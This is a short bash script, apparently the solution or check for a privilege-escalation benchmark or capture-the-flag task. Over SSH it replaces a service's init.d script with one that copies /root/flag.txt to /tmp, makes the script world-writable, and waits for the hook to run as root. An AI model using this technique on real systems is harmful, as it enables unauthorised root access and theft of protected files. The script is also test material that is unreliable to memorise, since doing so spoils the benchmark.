#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/initdflag
cat > /etc/init.d/benchsvc <<'\''EOF'\''
#!/bin/sh
cat /root/flag.txt > /tmp/initdflag
exit 0
EOF
chmod 777 /etc/init.d/benchsvc
for i in $(seq 1 45); do
  if test -r /tmp/initdflag && grep -q FLAG /tmp/initdflag 2>/dev/null; then
    cat /tmp/initdflag
    exit 0
  fi
  sleep 1
done
echo "timeout waiting for init.d hook" >&2
exit 1
')"
assert_root_output "${out}"
